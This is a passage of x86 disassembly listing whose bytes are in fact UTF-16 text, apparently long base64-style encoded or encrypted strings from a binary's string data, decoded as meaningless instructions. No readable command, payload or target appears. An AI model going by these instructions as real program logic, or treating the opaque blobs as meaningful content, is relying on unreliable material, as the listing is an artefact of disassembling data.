  40b925:	45                   	inc    %ebp
  40b926:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
  40b92a:	00 63 00             	add    %ah,0x0(%ebx)
  40b92d:	72 00                	jb     0x40b92f
  40b92f:	6a 00                	push   $0x0
  40b931:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40b935:	38 00                	cmp    %al,(%eax)
  40b937:	68 00 6c 00 73       	push   $0x73006c00
  40b93c:	00 6f 00             	add    %ch,0x0(%edi)
  40b93f:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40b943:	54                   	push   %esp
  40b944:	00 6d 00             	add    %ch,0x0(%ebp)
  40b947:	6b 00 59             	imul   $0x59,(%eax),%eax
  40b94a:	00 7a 00             	add    %bh,0x0(%edx)
  40b94d:	49                   	dec    %ecx
  40b94e:	00 4e 00             	add    %cl,0x0(%esi)
  40b951:	79 00                	jns    0x40b953
  40b953:	43                   	inc    %ebx
  40b954:	00 50 00             	add    %dl,0x0(%eax)
  40b957:	49                   	dec    %ecx
  40b958:	00 63 00             	add    %ah,0x0(%ebx)
  40b95b:	4d                   	dec    %ebp
  40b95c:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  40b960:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  40b964:	00 6e 00             	add    %ch,0x0(%esi)
  40b967:	39 00                	cmp    %eax,(%eax)
  40b969:	6f                   	outsl  %ds:(%esi),(%dx)
  40b96a:	00 75 00             	add    %dh,0x0(%ebp)
  40b96d:	75 00                	jne    0x40b96f
  40b96f:	62 00                	bound  %eax,(%eax)
  40b971:	62 00                	bound  %eax,(%eax)
  40b973:	63 00                	arpl   %eax,(%eax)
  40b975:	34 00                	xor    $0x0,%al
  40b977:	35 00 6e 00 68       	xor    $0x68006e00,%eax
  40b97c:	00 6f 00             	add    %ch,0x0(%edi)
  40b97f:	43                   	inc    %ebx
  40b980:	00 72 00             	add    %dh,0x0(%edx)
  40b983:	43                   	inc    %ebx
  40b984:	00 4a 00             	add    %cl,0x0(%edx)
  40b987:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40b98b:	41                   	inc    %ecx
  40b98c:	00 48 00             	add    %cl,0x0(%eax)
  40b98f:	46                   	inc    %esi
  40b990:	00 72 00             	add    %dh,0x0(%edx)
  40b993:	51                   	push   %ecx
  40b994:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b998:	00 67 00             	add    %ah,0x0(%edi)
  40b99b:	48                   	dec    %eax
  40b99c:	00 42 00             	add    %al,0x0(%edx)
  40b99f:	54                   	push   %esp
  40b9a0:	00 30                	add    %dh,(%eax)
  40b9a2:	00 50 00             	add    %dl,0x0(%eax)
  40b9a5:	44                   	inc    %esp
  40b9a6:	00 33                	add    %dh,(%ebx)
  40b9a8:	00 73 00             	add    %dh,0x0(%ebx)
  40b9ab:	4f                   	dec    %edi
  40b9ac:	00 49 00             	add    %cl,0x0(%ecx)
  40b9af:	52                   	push   %edx
  40b9b0:	00 69 00             	add    %ch,0x0(%ecx)
  40b9b3:	69 00 4d 00 46 00    	imul   $0x46004d,(%eax),%eax
  40b9b9:	4d                   	dec    %ebp
  40b9ba:	00 5a 00             	add    %bl,0x0(%edx)
  40b9bd:	39 00                	cmp    %eax,(%eax)
  40b9bf:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9c0:	00 56 00             	add    %dl,0x0(%esi)
  40b9c3:	4b                   	dec    %ebx
  40b9c4:	00 42 00             	add    %al,0x0(%edx)
  40b9c7:	57                   	push   %edi
  40b9c8:	00 4a 00             	add    %cl,0x0(%edx)
  40b9cb:	32 00                	xor    (%eax),%al
  40b9cd:	6e                   	outsb  %ds:(%esi),(%dx)
  40b9ce:	00 30                	add    %dh,(%eax)
  40b9d0:	00 75 00             	add    %dh,0x0(%ebp)
  40b9d3:	69 00 4a 00 67 00    	imul   $0x67004a,(%eax),%eax
  40b9d9:	69 00 67 00 72 00    	imul   $0x720067,(%eax),%eax
  40b9df:	46                   	inc    %esi
  40b9e0:	00 4d 00             	add    %cl,0x0(%ebp)
  40b9e3:	41                   	inc    %ecx
  40b9e4:	00 70 00             	add    %dh,0x0(%eax)
  40b9e7:	47                   	inc    %edi
  40b9e8:	00 75 00             	add    %dh,0x0(%ebp)
  40b9eb:	41                   	inc    %ecx
  40b9ec:	00 52 00             	add    %dl,0x0(%edx)
  40b9ef:	4e                   	dec    %esi
  40b9f0:	00 50 00             	add    %dl,0x0(%eax)
  40b9f3:	77 00                	ja     0x40b9f5
  40b9f5:	55                   	push   %ebp
  40b9f6:	00 59 00             	add    %bl,0x0(%ecx)
  40b9f9:	73 00                	jae    0x40b9fb
  40b9fb:	6d                   	insl   (%dx),%es:(%edi)
  40b9fc:	00 36                	add    %dh,(%esi)
  40b9fe:	00 61 00             	add    %ah,0x0(%ecx)
  40ba01:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40ba04:	00 65 00             	add    %ah,0x0(%ebp)
  40ba07:	4c                   	dec    %esp
  40ba08:	00 62 00             	add    %ah,0x0(%edx)
  40ba0b:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40ba0f:	52                   	push   %edx
  40ba10:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  40ba14:	00 55 00             	add    %dl,0x0(%ebp)
  40ba17:	49                   	dec    %ecx
  40ba18:	00 31                	add    %dh,(%ecx)
  40ba1a:	00 6a 00             	add    %ch,0x0(%edx)
  40ba1d:	42                   	inc    %edx
  40ba1e:	00 68 00             	add    %ch,0x0(%eax)
  40ba21:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba22:	00 4b 00             	add    %cl,0x0(%ebx)
  40ba25:	67 00 6f 00          	add    %ch,0x0(%bx)
  40ba29:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40ba2d:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba2e:	00 46 00             	add    %al,0x0(%esi)
  40ba31:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba32:	00 30                	add    %dh,(%eax)
  40ba34:	00 6e 00             	add    %ch,0x0(%esi)
  40ba37:	34 00                	xor    $0x0,%al
  40ba39:	34 00                	xor    $0x0,%al
  40ba3b:	56                   	push   %esi
  40ba3c:	00 71 00             	add    %dh,0x0(%ecx)
  40ba3f:	73 00                	jae    0x40ba41
  40ba41:	59                   	pop    %ecx
  40ba42:	00 7a 00             	add    %bh,0x0(%edx)
  40ba45:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40ba48:	00 72 00             	add    %dh,0x0(%edx)
  40ba4b:	72 00                	jb     0x40ba4d
  40ba4d:	39 00                	cmp    %eax,(%eax)
  40ba4f:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba50:	00 79 00             	add    %bh,0x0(%ecx)
  40ba53:	66 00 37             	data16 add %dh,(%edi)
  40ba56:	00 56 00             	add    %dl,0x0(%esi)
  40ba59:	43                   	inc    %ebx
  40ba5a:	00 41 00             	add    %al,0x0(%ecx)
  40ba5d:	75 00                	jne    0x40ba5f
  40ba5f:	39 00                	cmp    %eax,(%eax)
  40ba61:	63 00                	arpl   %eax,(%eax)
  40ba63:	55                   	push   %ebp
  40ba64:	00 47 00             	add    %al,0x0(%edi)
  40ba67:	66 00 6a 00          	data16 add %ch,0x0(%edx)
  40ba6b:	44                   	inc    %esp
  40ba6c:	00 62 00             	add    %ah,0x0(%edx)
  40ba6f:	7a 00                	jp     0x40ba71
  40ba71:	2b 00                	sub    (%eax),%eax
  40ba73:	6d                   	insl   (%dx),%es:(%edi)
  40ba74:	00 30                	add    %dh,(%eax)
  40ba76:	00 35 00 6d 00 4d    	add    %dh,0x4d006d00
  40ba7c:	00 55 00             	add    %dl,0x0(%ebp)
  40ba7f:	54                   	push   %esp
  40ba80:	00 30                	add    %dh,(%eax)
  40ba82:	00 7a 00             	add    %bh,0x0(%edx)
  40ba85:	42                   	inc    %edx
  40ba86:	00 65 00             	add    %ah,0x0(%ebp)
  40ba89:	59                   	pop    %ecx
  40ba8a:	00 57 00             	add    %dl,0x0(%edi)
  40ba8d:	51                   	push   %ecx
  40ba8e:	00 32                	add    %dh,(%edx)
  40ba90:	00 4a 00             	add    %cl,0x0(%edx)
  40ba93:	2b 00                	sub    (%eax),%eax
  40ba95:	78 00                	js     0x40ba97
  40ba97:	53                   	push   %ebx
  40ba98:	00 75 00             	add    %dh,0x0(%ebp)
  40ba9b:	37                   	aaa
  40ba9c:	00 6f 00             	add    %ch,0x0(%edi)
  40ba9f:	49                   	dec    %ecx
  40baa0:	00 55 00             	add    %dl,0x0(%ebp)
  40baa3:	64 00 35 00 32 00 34 	add    %dh,%fs:0x34003200
  40baaa:	00 7a 00             	add    %bh,0x0(%edx)
  40baad:	53                   	push   %ebx
  40baae:	00 35 00 74 00 41    	add    %dh,0x41007400
  40bab4:	00 70 00             	add    %dh,0x0(%eax)
  40bab7:	50                   	push   %eax
  40bab8:	00 67 00             	add    %ah,0x0(%edi)
  40babb:	38 00                	cmp    %al,(%eax)
  40babd:	43                   	inc    %ebx
  40babe:	00 51 00             	add    %dl,0x0(%ecx)
  40bac1:	79 00                	jns    0x40bac3
  40bac3:	37                   	aaa
  40bac4:	00 6f 00             	add    %ch,0x0(%edi)
  40bac7:	6f                   	outsl  %ds:(%esi),(%dx)
  40bac8:	00 4d 00             	add    %cl,0x0(%ebp)
  40bacb:	4a                   	dec    %edx
  40bacc:	00 66 00             	add    %ah,0x0(%esi)
  40bacf:	2b 00                	sub    (%eax),%eax
  40bad1:	7a 00                	jp     0x40bad3
  40bad3:	47                   	inc    %edi
  40bad4:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  40bad8:	00 67 00             	add    %ah,0x0(%edi)
  40badb:	5a                   	pop    %edx
  40badc:	00 6d 00             	add    %ch,0x0(%ebp)
  40badf:	78 00                	js     0x40bae1
  40bae1:	44                   	inc    %esp
  40bae2:	00 7a 00             	add    %bh,0x0(%edx)
  40bae5:	35 00 4a 00 47       	xor    $0x47004a00,%eax
  40baea:	00 4b 00             	add    %cl,0x0(%ebx)
  40baed:	35 00 72 00 35       	xor    $0x35007200,%eax
  40baf2:	00 6e 00             	add    %ch,0x0(%esi)
  40baf5:	52                   	push   %edx
  40baf6:	00 43 00             	add    %al,0x0(%ebx)
  40baf9:	37                   	aaa
  40bafa:	00 4e 00             	add    %cl,0x0(%esi)
  40bafd:	78 00                	js     0x40baff
  40baff:	5a                   	pop    %edx
  40bb00:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bb03:	62 00                	bound  %eax,(%eax)
  40bb05:	79 00                	jns    0x40bb07
  40bb07:	47                   	inc    %edi
  40bb08:	00 36                	add    %dh,(%esi)
  40bb0a:	00 6a 00             	add    %ch,0x0(%edx)
  40bb0d:	69 00 53 00 4d 00    	imul   $0x4d0053,(%eax),%eax
  40bb13:	48                   	dec    %eax
  40bb14:	00 73 00             	add    %dh,0x0(%ebx)
  40bb17:	4d                   	dec    %ebp
  40bb18:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40bb1c:	00 38                	add    %bh,(%eax)
  40bb1e:	00 37                	add    %dh,(%edi)
  40bb20:	00 33                	add    %dh,(%ebx)
  40bb22:	00 6a 00             	add    %ch,0x0(%edx)
  40bb25:	38 00                	cmp    %al,(%eax)
  40bb27:	47                   	inc    %edi
  40bb28:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bb2b:	36 00 36             	add    %dh,%ss:(%esi)
  40bb2e:	00 48 00             	add    %cl,0x0(%eax)
  40bb31:	52                   	push   %edx
  40bb32:	00 70 00             	add    %dh,0x0(%eax)
  40bb35:	56                   	push   %esi
  40bb36:	00 75 00             	add    %dh,0x0(%ebp)
  40bb39:	41                   	inc    %ecx
  40bb3a:	00 63 00             	add    %ah,0x0(%ebx)
  40bb3d:	49                   	dec    %ecx
  40bb3e:	00 4a 00             	add    %cl,0x0(%edx)
  40bb41:	4d                   	dec    %ebp
  40bb42:	00 4e 00             	add    %cl,0x0(%esi)
  40bb45:	4a                   	dec    %edx
  40bb46:	00 61 00             	add    %ah,0x0(%ecx)
  40bb49:	77 00                	ja     0x40bb4b
  40bb4b:	78 00                	js     0x40bb4d
  40bb4d:	58                   	pop    %eax
  40bb4e:	00 6a 00             	add    %ch,0x0(%edx)
  40bb51:	4b                   	dec    %ebx
  40bb52:	00 47 00             	add    %al,0x0(%edi)
  40bb55:	4c                   	dec    %esp
  40bb56:	00 57 00             	add    %dl,0x0(%edi)
  40bb59:	6b 00 56             	imul   $0x56,(%eax),%eax
  40bb5c:	00 46 00             	add    %al,0x0(%esi)
  40bb5f:	39 00                	cmp    %eax,(%eax)
  40bb61:	45                   	inc    %ebp
  40bb62:	00 31                	add    %dh,(%ecx)
  40bb64:	00 50 00             	add    %dl,0x0(%eax)
  40bb67:	72 00                	jb     0x40bb69
  40bb69:	39 00                	cmp    %eax,(%eax)
  40bb6b:	32 00                	xor    (%eax),%al
  40bb6d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb6e:	00 77 00             	add    %dh,0x0(%edi)
  40bb71:	47                   	inc    %edi
  40bb72:	00 42 00             	add    %al,0x0(%edx)
  40bb75:	59                   	pop    %ecx
  40bb76:	00 7a 00             	add    %bh,0x0(%edx)
  40bb79:	4f                   	dec    %edi
  40bb7a:	00 33                	add    %dh,(%ebx)
  40bb7c:	00 47 00             	add    %al,0x0(%edi)
  40bb7f:	77 00                	ja     0x40bb81
  40bb81:	43                   	inc    %ebx
  40bb82:	00 6e 00             	add    %ch,0x0(%esi)
  40bb85:	4d                   	dec    %ebp
  40bb86:	00 36                	add    %dh,(%esi)
  40bb88:	00 6a 00             	add    %ch,0x0(%edx)
  40bb8b:	45                   	inc    %ebp
  40bb8c:	00 75 00             	add    %dh,0x0(%ebp)
  40bb8f:	6b 00 32             	imul   $0x32,(%eax),%eax
  40bb92:	00 57 00             	add    %dl,0x0(%edi)
  40bb95:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb96:	00 73 00             	add    %dh,0x0(%ebx)
  40bb99:	70 00                	jo     0x40bb9b
  40bb9b:	42                   	inc    %edx
  40bb9c:	00 4c 00 71          	add    %cl,0x71(%eax,%eax,1)
  40bba0:	00 4d 00             	add    %cl,0x0(%ebp)
  40bba3:	6a 00                	push   $0x0
  40bba5:	65 00 54 00 4f       	add    %dl,%gs:0x4f(%eax,%eax,1)
  40bbaa:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  40bbae:	00 4b 00             	add    %cl,0x0(%ebx)
  40bbb1:	44                   	inc    %esp
  40bbb2:	00 4a 00             	add    %cl,0x0(%edx)
  40bbb5:	69 00 62 00 48 00    	imul   $0x480062,(%eax),%eax
  40bbbb:	51                   	push   %ecx
  40bbbc:	00 53 00             	add    %dl,0x0(%ebx)
  40bbbf:	39 00                	cmp    %eax,(%eax)
  40bbc1:	41                   	inc    %ecx
  40bbc2:	00 6a 00             	add    %ch,0x0(%edx)
  40bbc5:	65 00 37             	add    %dh,%gs:(%edi)
  40bbc8:	00 6f 00             	add    %ch,0x0(%edi)
  40bbcb:	30 00                	xor    %al,(%eax)
  40bbcd:	7a 00                	jp     0x40bbcf
  40bbcf:	4a                   	dec    %edx
  40bbd0:	00 4f 00             	add    %cl,0x0(%edi)
  40bbd3:	72 00                	jb     0x40bbd5
  40bbd5:	68 00 71 00 55       	push   $0x55007100
  40bbda:	00 52 00             	add    %dl,0x0(%edx)
  40bbdd:	68 00 59 00 6d       	push   $0x6d005900
  40bbe2:	00 68 00             	add    %ch,0x0(%eax)
  40bbe5:	64 00 6c 00 37       	add    %ch,%fs:0x37(%eax,%eax,1)
  40bbea:	00 2b                	add    %ch,(%ebx)
  40bbec:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40bbf0:	00 53 00             	add    %dl,0x0(%ebx)
  40bbf3:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbf4:	00 66 00             	add    %ah,0x0(%esi)
  40bbf7:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbf8:	00 73 00             	add    %dh,0x0(%ebx)
  40bbfb:	78 00                	js     0x40bbfd
  40bbfd:	6c                   	insb   (%dx),%es:(%edi)
  40bbfe:	00 37                	add    %dh,(%edi)
  40bc00:	00 73 00             	add    %dh,0x0(%ebx)
  40bc03:	4c                   	dec    %esp
  40bc04:	00 32                	add    %dh,(%edx)
  40bc06:	00 4f 00             	add    %cl,0x0(%edi)
  40bc09:	49                   	dec    %ecx
  40bc0a:	00 43 00             	add    %al,0x0(%ebx)
  40bc0d:	33 00                	xor    (%eax),%eax
  40bc0f:	42                   	inc    %edx
  40bc10:	00 66 00             	add    %ah,0x0(%esi)
  40bc13:	79 00                	jns    0x40bc15
  40bc15:	4a                   	dec    %edx
  40bc16:	00 52 00             	add    %dl,0x0(%edx)
  40bc19:	46                   	inc    %esi
  40bc1a:	00 4c 00 6a          	add    %cl,0x6a(%eax,%eax,1)
  40bc1e:	00 6b 00             	add    %ch,0x0(%ebx)
  40bc21:	55                   	push   %ebp
  40bc22:	00 67 00             	add    %ah,0x0(%edi)
  40bc25:	57                   	push   %edi
  40bc26:	00 56 00             	add    %dl,0x0(%esi)
  40bc29:	54                   	push   %esp
  40bc2a:	00 6b 00             	add    %ch,0x0(%ebx)
  40bc2d:	34 00                	xor    $0x0,%al
  40bc2f:	45                   	inc    %ebp
  40bc30:	00 45 00             	add    %al,0x0(%ebp)
  40bc33:	54                   	push   %esp
  40bc34:	00 73 00             	add    %dh,0x0(%ebx)
  40bc37:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  40bc3b:	30 00                	xor    %al,(%eax)
  40bc3d:	55                   	push   %ebp
  40bc3e:	00 37                	add    %dh,(%edi)
  40bc40:	00 42 00             	add    %al,0x0(%edx)
  40bc43:	59                   	pop    %ecx
  40bc44:	00 59 00             	add    %bl,0x0(%ecx)
  40bc47:	49                   	dec    %ecx
  40bc48:	00 2b                	add    %ch,(%ebx)
  40bc4a:	00 68 00             	add    %ch,0x0(%eax)
  40bc4d:	75 00                	jne    0x40bc4f
  40bc4f:	30 00                	xor    %al,(%eax)
  40bc51:	4d                   	dec    %ebp
  40bc52:	00 6b 00             	add    %ch,0x0(%ebx)
  40bc55:	41                   	inc    %ecx
  40bc56:	00 31                	add    %dh,(%ecx)
  40bc58:	00 69 00             	add    %ch,0x0(%ecx)
  40bc5b:	56                   	push   %esi
  40bc5c:	00 53 00             	add    %dl,0x0(%ebx)
  40bc5f:	44                   	inc    %esp
  40bc60:	00 6f 00             	add    %ch,0x0(%edi)
  40bc63:	43                   	inc    %ebx
  40bc64:	00 77 00             	add    %dh,0x0(%edi)
  40bc67:	6d                   	insl   (%dx),%es:(%edi)
  40bc68:	00 51 00             	add    %dl,0x0(%ecx)
  40bc6b:	30 00                	xor    %al,(%eax)
  40bc6d:	2b 00                	sub    (%eax),%eax
  40bc6f:	44                   	inc    %esp
  40bc70:	00 61 00             	add    %ah,0x0(%ecx)
  40bc73:	56                   	push   %esi
  40bc74:	00 53 00             	add    %dl,0x0(%ebx)
  40bc77:	58                   	pop    %eax
  40bc78:	00 77 00             	add    %dh,0x0(%edi)
  40bc7b:	6c                   	insb   (%dx),%es:(%edi)
  40bc7c:	00 59 00             	add    %bl,0x0(%ecx)
  40bc7f:	68 00 52 00 41       	push   $0x41005200
  40bc84:	00 44 00 47          	add    %al,0x47(%eax,%eax,1)
  40bc88:	00 48 00             	add    %cl,0x0(%eax)
  40bc8b:	59                   	pop    %ecx
  40bc8c:	00 75 00             	add    %dh,0x0(%ebp)
  40bc8f:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  40bc93:	62 00                	bound  %eax,(%eax)
  40bc95:	72 00                	jb     0x40bc97
  40bc97:	34 00                	xor    $0x0,%al
  40bc99:	45                   	inc    %ebp
  40bc9a:	00 46 00             	add    %al,0x0(%esi)
  40bc9d:	30 00                	xor    %al,(%eax)
  40bc9f:	32 00                	xor    (%eax),%al
  40bca1:	37                   	aaa
  40bca2:	00 47 00             	add    %al,0x0(%edi)
  40bca5:	79 00                	jns    0x40bca7
  40bca7:	4c                   	dec    %esp
  40bca8:	00 73 00             	add    %dh,0x0(%ebx)
  40bcab:	75 00                	jne    0x40bcad
  40bcad:	4a                   	dec    %edx
  40bcae:	00 49 00             	add    %cl,0x0(%ecx)
  40bcb1:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40bcb5:	4c                   	dec    %esp
  40bcb6:	00 4e 00             	add    %cl,0x0(%esi)
  40bcb9:	4e                   	dec    %esi
  40bcba:	00 58 00             	add    %bl,0x0(%eax)
  40bcbd:	4f                   	dec    %edi
  40bcbe:	00 33                	add    %dh,(%ebx)
  40bcc0:	00 2f                	add    %ch,(%edi)
  40bcc2:	00 70 00             	add    %dh,0x0(%eax)
  40bcc5:	63 00                	arpl   %eax,(%eax)
  40bcc7:	72 00                	jb     0x40bcc9
  40bcc9:	48                   	dec    %eax
  40bcca:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  40bcce:	00 43 00             	add    %al,0x0(%ebx)
  40bcd1:	71 00                	jno    0x40bcd3
  40bcd3:	34 00                	xor    $0x0,%al
  40bcd5:	32 00                	xor    (%eax),%al
  40bcd7:	4f                   	dec    %edi
  40bcd8:	00 30                	add    %dh,(%eax)
  40bcda:	00 57 00             	add    %dl,0x0(%edi)
  40bcdd:	49                   	dec    %ecx
  40bcde:	00 71 00             	add    %dh,0x0(%ecx)
  40bce1:	49                   	dec    %ecx
  40bce2:	00 47 00             	add    %al,0x0(%edi)
  40bce5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bce6:	00 58 00             	add    %bl,0x0(%eax)
  40bce9:	57                   	push   %edi
  40bcea:	00 56 00             	add    %dl,0x0(%esi)
  40bced:	51                   	push   %ecx
  40bcee:	00 45 00             	add    %al,0x0(%ebp)
  40bcf1:	34 00                	xor    $0x0,%al
  40bcf3:	45                   	inc    %ebp
  40bcf4:	00 59 00             	add    %bl,0x0(%ecx)
  40bcf7:	35 00 4f 00 57       	xor    $0x57004f00,%eax
  40bcfc:	00 77 00             	add    %dh,0x0(%edi)
  40bcff:	34 00                	xor    $0x0,%al
  40bd01:	6a 00                	push   $0x0
  40bd03:	47                   	inc    %edi
  40bd04:	00 46 00             	add    %al,0x0(%esi)
  40bd07:	4d                   	dec    %ebp
  40bd08:	00 59 00             	add    %bl,0x0(%ecx)
  40bd0b:	78 00                	js     0x40bd0d
  40bd0d:	42                   	inc    %edx
  40bd0e:	00 66 00             	add    %ah,0x0(%esi)
  40bd11:	68 00 5a 00 76       	push   $0x76005a00
  40bd16:	00 4a 00             	add    %cl,0x0(%edx)
  40bd19:	76 00                	jbe    0x40bd1b
  40bd1b:	57                   	push   %edi
  40bd1c:	00 73 00             	add    %dh,0x0(%ebx)
  40bd1f:	53                   	push   %ebx
  40bd20:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40bd24:	00 4b 00             	add    %cl,0x0(%ebx)
  40bd27:	62 00                	bound  %eax,(%eax)
  40bd29:	45                   	inc    %ebp
  40bd2a:	00 63 00             	add    %ah,0x0(%ebx)
  40bd2d:	6c                   	insb   (%dx),%es:(%edi)
  40bd2e:	00 75 00             	add    %dh,0x0(%ebp)
  40bd31:	4c                   	dec    %esp
  40bd32:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  40bd36:	00 31                	add    %dh,(%ecx)
  40bd38:	00 51 00             	add    %dl,0x0(%ecx)
  40bd3b:	79 00                	jns    0x40bd3d
  40bd3d:	55                   	push   %ebp
  40bd3e:	00 68 00             	add    %ch,0x0(%eax)
  40bd41:	56                   	push   %esi
  40bd42:	00 71 00             	add    %dh,0x0(%ecx)
  40bd45:	77 00                	ja     0x40bd47
  40bd47:	61                   	popa
  40bd48:	00 42 00             	add    %al,0x0(%edx)
  40bd4b:	50                   	push   %eax
  40bd4c:	00 41 00             	add    %al,0x0(%ecx)
  40bd4f:	6b 00 52             	imul   $0x52,(%eax),%eax
  40bd52:	00 77 00             	add    %dh,0x0(%edi)
  40bd55:	43                   	inc    %ebx
  40bd56:	00 5a 00             	add    %bl,0x0(%edx)
  40bd59:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  40bd5d:	4c                   	dec    %esp
  40bd5e:	00 66 00             	add    %ah,0x0(%esi)
  40bd61:	31 00                	xor    %eax,(%eax)
  40bd63:	59                   	pop    %ecx
  40bd64:	00 57 00             	add    %dl,0x0(%edi)
  40bd67:	79 00                	jns    0x40bd69
  40bd69:	44                   	inc    %esp
  40bd6a:	00 2f                	add    %ch,(%edi)
  40bd6c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bd6f:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bd73:	79 00                	jns    0x40bd75
  40bd75:	41                   	inc    %ecx
  40bd76:	00 57 00             	add    %dl,0x0(%edi)
  40bd79:	31 00                	xor    %eax,(%eax)
  40bd7b:	32 00                	xor    (%eax),%al
  40bd7d:	52                   	push   %edx
  40bd7e:	00 66 00             	add    %ah,0x0(%esi)
  40bd81:	50                   	push   %eax
  40bd82:	00 76 00             	add    %dh,0x0(%esi)
  40bd85:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40bd89:	30 00                	xor    %al,(%eax)
  40bd8b:	42                   	inc    %edx
  40bd8c:	00 6f 00             	add    %ch,0x0(%edi)
  40bd8f:	45                   	inc    %ebp
  40bd90:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40bd94:	00 76 00             	add    %dh,0x0(%esi)
  40bd97:	74 00                	je     0x40bd99
  40bd99:	78 00                	js     0x40bd9b
  40bd9b:	4a                   	dec    %edx
  40bd9c:	00 47 00             	add    %al,0x0(%edi)
  40bd9f:	68 00 71 00 36       	push   $0x36007100
  40bda4:	00 64 00 35          	add    %ah,0x35(%eax,%eax,1)
  40bda8:	00 5a 00             	add    %bl,0x0(%edx)
  40bdab:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  40bdaf:	42                   	inc    %edx
  40bdb0:	00 49 00             	add    %cl,0x0(%ecx)
  40bdb3:	33 00                	xor    (%eax),%eax
  40bdb5:	74 00                	je     0x40bdb7
  40bdb7:	57                   	push   %edi
  40bdb8:	00 78 00             	add    %bh,0x0(%eax)
  40bdbb:	71 00                	jno    0x40bdbd
  40bdbd:	46                   	inc    %esi
  40bdbe:	00 6d 00             	add    %ch,0x0(%ebp)
  40bdc1:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40bdc5:	41                   	inc    %ecx
  40bdc6:	00 4a 00             	add    %cl,0x0(%edx)
  40bdc9:	6b 00 32             	imul   $0x32,(%eax),%eax
  40bdcc:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  40bdd0:	00 72 00             	add    %dh,0x0(%edx)
  40bdd3:	78 00                	js     0x40bdd5
  40bdd5:	4b                   	dec    %ebx
  40bdd6:	00 6f 00             	add    %ch,0x0(%edi)
  40bdd9:	50                   	push   %eax
  40bdda:	00 76 00             	add    %dh,0x0(%esi)
  40bddd:	5a                   	pop    %edx
  40bdde:	00 72 00             	add    %dh,0x0(%edx)
  40bde1:	47                   	inc    %edi
  40bde2:	00 75 00             	add    %dh,0x0(%ebp)
  40bde5:	51                   	push   %ecx
  40bde6:	00 61 00             	add    %ah,0x0(%ecx)
  40bde9:	46                   	inc    %esi
  40bdea:	00 73 00             	add    %dh,0x0(%ebx)
  40bded:	6a 00                	push   $0x0
  40bdef:	78 00                	js     0x40bdf1
  40bdf1:	66 00 57 00          	data16 add %dl,0x0(%edi)
  40bdf5:	2f                   	das
  40bdf6:	00 6f 00             	add    %ch,0x0(%edi)
  40bdf9:	51                   	push   %ecx
  40bdfa:	00 51 00             	add    %dl,0x0(%ecx)
  40bdfd:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40be02:	80 b1 6e 00 77 00 64 	xorb   $0x64,0x77006e(%ecx)
  40be09:	00 6d 00             	add    %ch,0x0(%ebp)
  40be0c:	4e                   	dec    %esi
  40be0d:	00 48 00             	add    %cl,0x0(%eax)
  40be10:	54                   	push   %esp
  40be11:	00 71 00             	add    %dh,0x0(%ecx)
  40be14:	75 00                	jne    0x40be16
  40be16:	46                   	inc    %esi
  40be17:	00 43 00             	add    %al,0x0(%ebx)
  40be1a:	39 00                	cmp    %eax,(%eax)
  40be1c:	73 00                	jae    0x40be1e
  40be1e:	4c                   	dec    %esp
  40be1f:	00 6b 00             	add    %ch,0x0(%ebx)
  40be22:	6b 00 48             	imul   $0x48,(%eax),%eax
  40be25:	00 51 00             	add    %dl,0x0(%ecx)
  40be28:	79 00                	jns    0x40be2a
  40be2a:	63 00                	arpl   %eax,(%eax)
  40be2c:	47                   	inc    %edi
  40be2d:	00 75 00             	add    %dh,0x0(%ebp)
  40be30:	38 00                	cmp    %al,(%eax)
  40be32:	2f                   	das
  40be33:	00 37                	add    %dh,(%edi)
  40be35:	00 39                	add    %bh,(%ecx)
  40be37:	00 53 00             	add    %dl,0x0(%ebx)
  40be3a:	34 00                	xor    $0x0,%al
  40be3c:	63 00                	arpl   %eax,(%eax)
  40be3e:	70 00                	jo     0x40be40
  40be40:	72 00                	jb     0x40be42
  40be42:	74 00                	je     0x40be44
  40be44:	62 00                	bound  %eax,(%eax)
  40be46:	50                   	push   %eax
  40be47:	00 53 00             	add    %dl,0x0(%ebx)
  40be4a:	68 00 4d 00 56       	push   $0x56004d00
  40be4f:	00 6f 00             	add    %ch,0x0(%edi)
  40be52:	49                   	dec    %ecx
  40be53:	00 5a 00             	add    %bl,0x0(%edx)
  40be56:	30 00                	xor    %al,(%eax)
  40be58:	54                   	push   %esp
  40be59:	00 71 00             	add    %dh,0x0(%ecx)
